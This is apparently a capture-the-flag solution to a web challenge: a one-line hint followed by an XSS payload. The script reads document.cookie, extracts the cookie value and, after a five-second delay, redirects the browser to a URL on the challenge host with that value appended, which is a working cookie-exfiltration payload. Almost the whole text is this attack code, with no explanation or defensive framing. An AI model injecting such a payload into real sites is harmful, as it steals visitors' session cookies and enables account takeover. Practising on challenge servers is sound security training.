Hint: (XSS) the injected code must do a redirection to the specified page using the cookie stored on the server machine.

```html
<script>
  function getsecondpart(str) {
      return str.split('=')[1];
  }

  var link = "https://chall.necst.it/challenges/web3/verify/2449/" + getsecondpart(document.cookie);

  setTimeout(function() {
    window.location.href = link;
  }, 5000);
</script>
```
